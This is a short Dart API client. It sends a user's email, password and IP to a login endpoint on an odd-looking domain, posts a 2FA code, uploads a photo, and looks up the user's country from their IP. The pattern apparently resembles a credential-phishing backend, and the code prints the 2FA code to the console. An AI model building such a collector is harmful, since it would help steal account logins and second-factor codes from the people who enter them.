import 'dart:convert';
import 'dart:typed_data';
import 'package:http/http.dart' as http;

const String _BaseURL = "https://api.sp-123.online";

class ApiClient {
  Future<String?> getCountry(String ip) async {
    final response = await http.get(
      Uri.parse('https://api.country.is/$ip'),
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
    );
    final jsonResponse = json.decode(response.body);
    return jsonResponse['country'];
  }

  Future<Map<String, dynamic>> login(
      String email, String password, String ip) async {
    final response = await http.post(
      Uri.parse('$_BaseURL/auth'),
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
      body: jsonEncode(
          <String, String>{'email': email, 'password': password, 'ip': ip}),
    );
    final jsonResponse = json.decode(response.body);
    return jsonResponse;
  }

  Future<Map<String, dynamic>> checkTwoFa(String email, String twofa) async {
    print("check email $email");
    print("check email $twofa");
    final response = await http.post(
      Uri.parse('$_BaseURL/login_with_2fa'),
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
      body: jsonEncode(<String, String>{'email': email, "twofa_code": twofa}),
    );
    // Nếu yêu cầu thành công, parse dữ liệu JSON
    final jsonResponse = json.decode(response.body);

    return jsonResponse;
  }

  Future<Map<String, dynamic>> uploadImage(
      String email, Uint8List imageFile) async {
    var url = Uri.parse('$_BaseURL/photo_upload');
    var request = http.MultipartRequest('POST', url);
    request.files.add(
      http.MultipartFile.fromBytes('file', imageFile),
    );
    request.fields['email'] = email;
    print("check request $request");
    var streamedResponse = await request.send();
    var response = await http.Response.fromStream(streamedResponse);

    final jsonResponse = json.decode(response.body);

    return jsonResponse;
  }

  Future<Map<String, dynamic>> checkLogin(String email) async {
    final response = await http.post(
      Uri.parse('$_BaseURL/check_login_api'),
      headers: <String, String>{
        'Content-Type': 'application/json; charset=UTF-8',
      },
      body: jsonEncode(<String, String>{'email': email}),
    );
    // Nếu yêu cầu thành công, parse dữ liệu JSON
    final jsonResponse = json.decode(response.body);
    return jsonResponse;
  }
}
